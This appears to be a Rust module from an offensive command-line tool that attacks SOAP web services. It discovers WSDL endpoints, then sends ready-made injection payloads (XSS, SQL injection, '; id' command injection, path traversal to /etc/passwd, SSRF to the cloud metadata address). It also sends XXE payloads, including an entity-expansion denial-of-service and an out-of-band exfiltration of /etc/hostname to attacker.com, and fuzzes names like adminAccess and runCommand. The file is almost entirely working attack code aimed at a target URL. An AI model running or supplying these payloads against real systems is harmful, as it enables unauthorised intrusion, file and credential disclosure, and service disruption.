use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn parse(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} WSDL/SOAP Service Parser", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let wsdl_paths = [
        "?wsdl", "?WSDL", "?wsdl=1",
        "/wsdl", "/api?wsdl", "/service?wsdl",
        "/axis2/services?wsdl", "/services?wsdl",
    ];

    for path in &wsdl_paths {
        let target = format!("{}{}", url.trim_end_matches('/'), path);
        match client.get(&target).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("wsdl:definitions") || text.contains("wsdl:") || text.contains("<definitions")) {
                    println!("  {} {:25} — WSDL FOUND ({} bytes)", "[!]".red().bold(), path, text.len());
                    let op_count = text.matches("<wsdl:operation").count();
                    let msg_count = text.matches("<wsdl:message").count();
                    println!("    Operations: {}, Messages: {}", op_count, msg_count);
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}

pub async fn inject(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SOAP Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let soap_payloads = [
        ("XSS inject", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test><name><script>alert(1)</script></name></test></soap:Body></soap:Envelope>"#),
        ("SQLi inject", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getUser><id>' OR '1'='1</id></getUser></soap:Body></soap:Envelope>"#),
        ("Command inject", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><exec><cmd>; id</cmd></exec></soap:Body></soap:Envelope>"#),
        ("SSRF inject", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><fetch><url>http://169.254.169.254/</url></fetch></soap:Body></soap:Envelope>"#),
        ("Traversal", r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><read><file>../../../etc/passwd</file></read></soap:Body></soap:Envelope>"#),
    ];

    for (name, payload) in &soap_payloads {
        match client.post(url).header("Content-Type", "text/xml").header("SOAPAction", "\"\"").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 200 && (text.contains("uid=") || text.contains("root:") || text.contains("169.254")) {
                    println!("  {} {:20} — INJECTED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn xxe(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SOAP XXE Attack", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let xxe_payloads = [
        ("File read", r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>"#),
        ("SSRF", r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>"#),
        ("Billion laughs", r#"<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&lol2;</test></soap:Body></soap:Envelope>"#),
        ("Parameter entity", r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>1</test></soap:Body></soap:Envelope>"#),
        ("OOB extract", r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % dtd "<!ENTITY exfil SYSTEM 'http://attacker.com/?%file;'>">%dtd;]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&exfil;</test></soap:Body></soap:Envelope>"#),
    ];

    for (name, payload) in &xxe_payloads {
        match client.post(url).header("Content-Type", "text/xml").header("SOAPAction", "\"\"").body(*payload).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                if status == 500 && text.contains("root:") {
                    println!("  {} {:20} — XXE CONFIRMED", "[!]".red().bold(), name);
                } else if status == 200 && text.contains("root:") {
                    println!("  {} {:20} — XXE CONFIRMED", "[!]".red().bold(), name);
                } else {
                    println!("  {} {:20} — status={}", "[-]".dimmed(), name, status);
                }
            }
            Err(_) => println!("  {} {:20} — error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn fuzz(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} SOAP Service Fuzzer", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let fuzz_operations = [
        "getUser", "deleteUser", "createUser", "updateUser", "adminAccess",
        "executeQuery", "runCommand", "uploadFile", "readFile", "getConfig",
        "setConfig", "login", "logout", "resetPassword", "grantAccess",
    ];

    let mut tested = 0u32;
    let mut hits = 0u32;

    for op in &fuzz_operations {
        let soap = format!(r#"<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><{}><arg>test</arg></{}></soap:Body></soap:Envelope>"#, op, op);
        match client.post(url).header("Content-Type", "text/xml").header("SOAPAction", &format!("\"urn:{}\"", op)).body(soap).send().await {
            Ok(r) => {
                let status = r.status().as_u16();
                let text = r.text().await.unwrap_or_default();
                tested += 1;
                if status == 200 {
                    hits += 1;
                    println!("  {} {:20} — VALID OPERATION", "[+]".green().bold(), op);
                } else if status == 500 && !text.contains("not found") {
                    hits += 1;
                    println!("  {} {:20} — EXISTS (error: {})", "[!]".yellow().bold(), op, status);
                }
            }
            Err(_) => {}
        }
    }

    println!("\n  {} {} operations tested, {} hits", "[*]".cyan().bold(), tested, hits);

    Ok(())
}
